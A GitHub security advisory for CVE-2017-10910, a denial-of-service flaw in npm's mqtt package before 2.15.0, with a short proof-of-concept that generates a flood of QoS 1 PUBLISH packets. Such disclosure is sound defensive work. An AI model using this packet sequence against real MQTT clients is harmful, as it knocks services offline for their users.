# [M] Denial of Service in mqtt

## Summary
Severity: Medium
Advisory: GHSA-h9mj-fghc-664w
CVE: CVE-2017-10910
CWE: CWE-674
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2017-12-28
Source: https://github.com/advisories/GHSA-h9mj-fghc-664w
Type: github-advisory

## Affected
- npm: `mqtt` — affected >=2.0.0 <2.15.0

## Details
Affected versions of `mqtt` do not properly handle PUBLISH packets returning from the server, leading to a Denial of Service condition.

The vulnerability is completely mitigated if the only connected servers are trusted, guaranteed not to be under the control of a malicious actor.

## Proof of Concept

The following is a demonstration of how to generate the malicious packet sequence, but does not include information on handling the initial network connections and MQTT overhead.
```
var mqttp = require('mqtt-packet');
var packets = [];
for(var i=0; i<=1000;i++){
    packets.push(
        mqttp.generate({
            cmd:'publish',
            topic:Buffer.from('hello'),
            payload:Buffer.from('world'),
            retain: false,
            dup: false, 
            messageId: ++i, 
            qos: 1
        })
    )
}

```


## Recommendation

Update to version 2.15.0 or later.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-10910
- https://github.com/mqttjs/MQTT.js/commit/403ba53b838f2d319a0c0505a045fe00239e9923
- https://github.com/advisories/GHSA-h9mj-fghc-664w
- https://github.com/mqttjs/MQTT.js
- https://github.com/mqttjs/MQTT.js/releases/tag/v2.15.0
- https://github.com/nodejs/security-wg/blob/master/vuln/npm/357.json
- https://jvn.jp/en/jp/JVN45494523/index.html
- https://www.npmjs.com/advisories/555
